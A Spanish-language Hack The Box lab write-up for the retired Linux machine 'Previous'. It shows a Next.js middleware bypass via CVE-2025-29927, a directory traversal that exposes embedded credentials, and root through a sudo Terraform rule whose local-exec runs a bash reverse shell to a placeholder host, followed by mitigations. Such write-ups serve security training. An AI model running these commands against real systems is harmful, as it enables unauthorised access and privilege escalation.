---
machine: Previous
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, nextjs, cve-2025-29927, auth-bypass, directory-traversal, terraform, privesc]
---

# Previous — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

`previous.htb` es una aplicación Next.js que documenta un framework JavaScript ficticio. El middleware protege la zona autenticada, pero la versión es vulnerable a la CVE-2025-29927: una cabecera `x-middleware-subrequest` hace que Next.js omita el middleware. Dentro de la zona privada, `/api/download` acepta un nombre de archivo y permite un directory traversal que lee la configuración de NextAuth, con credenciales embebidas que funcionan para SSH como `jeremy`. Para root se abusa de una regla de `sudo` que ejecuta Terraform: un archivo de configuración malicioso con un `local-exec` y la sobrescritura de variables permiten ejecutar comandos como root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` OpenSSH 8.9p1 Ubuntu 3ubuntu0.13.
- `80` nginx 1.18.0 (Ubuntu).
- La web se sirve como `previous.htb`.

```bash
feroxbuster -u http://previous.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

Aparecen `/docs`, `/login` y `/dashboard`; el dashboard redirige al login sin sesión.

## Enumeración

La web presenta el framework y sus ejemplos. En `/docs/examples` hay un enlace de descarga:

```text
/api/download?example=hello-world.ts
```

El parámetro se usa como ruta de archivo. Al modificarlo con `../` se leen archivos fuera del directorio de ejemplos, incluidos los del proyecto.

La respuesta del servidor incluye la cabecera de versión de Next.js; la versión está en el rango afectado por la CVE-2025-29927.

## Foothold

La CVE-2025-29927 permite saltarse el middleware que comprueba la sesión. Se añade la cabecera a la petición:

```bash
curl -s http://previous.htb/dashboard -H "x-middleware-subrequest: middleware"
```

El dashboard responde sin cookie de sesión. Desde la zona autenticada se usa el traversal para leer los archivos de configuración de NextAuth, que contienen credenciales embebidas:

```bash
curl -s "http://previous.htb/api/download?example=../../../../<RUTA>/<CONFIG>"
```

Las credenciales se prueban por SSH y funcionan para `jeremy`.

## Movimiento lateral

`jeremy` no tiene acceso a otro host. Su home contiene archivos de configuración y un directorio de trabajo desde el que se ejecuta Terraform. La enumeración se centra en `sudo`, en los permisos de los archivos y en los procesos que usan esas credenciales.

## Escalada de privilegios

`sudo -l` muestra que `jeremy` puede ejecutar Terraform como root, con una regla que conserva el directorio de trabajo o variables de entorno. Terraform ejecuta `local-exec` al aplicar una configuración; un archivo `main.tf` propio puede lanzar un comando:

```hcl
resource "null_resource" "pwn" {
  provisioner "local-exec" {
    command = "bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"
  }
}
```

```bash
sudo terraform init
sudo terraform apply -auto-approve
```

La regla también permite sobrescribir variables con `-var` o mediante el entorno, de modo que se puede leer un archivo de root o escribir una clave. La shell resultante es de root.

## Evidencia

- Versión de Next.js vulnerable y `/dashboard` accesible con la cabecera.
- `/api/download` con traversal y lectura de la configuración de NextAuth.
- Credenciales embebidas y SSH como `jeremy`.
- `sudo -l` con Terraform.
- `main.tf` con `local-exec` y shell de root.

## Lecciones aprendidas

- Un bypass de middleware invalida todas las comprobaciones que viven solo ahí.
- Un parámetro de descarga sin normalizar es un file read.
- Las credenciales embebidas en el código llegan a producción y se reutilizan.
- `sudo` sobre una herramienta que ejecuta configuración es equivalente a `sudo` sobre un intérprete.
- Terraform aplica `local-exec` con los privilegios con los que se ejecuta.

## Mitigaciones y detección

- Actualizar Next.js a una versión corregida y validar la autorización también en cada ruta.
- Rechazar peticiones externas con `x-middleware-subrequest` en el proxy.
- Normalizar y limitar las rutas de descarga a un directorio base.
- Sacar secretos del código y usar un gestor de secretos.
- No dar `sudo` sobre Terraform, Ansible u otras herramientas que ejecutan configuración; usar un runner aislado.
- Alertar de `terraform apply` con `local-exec` y de lecturas de configuración de auth.

## Referencias

- [0xdf — Previous](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [IppSec — Previous](https://www.youtube.com/watch?v=WPUTGuitC_8)
- [Hack The Box — Previous](https://app.hackthebox.com/machines/previous)
- [NVD — CVE-2025-29927](https://nvd.nist.gov/vuln/detail/CVE-2025-29927)
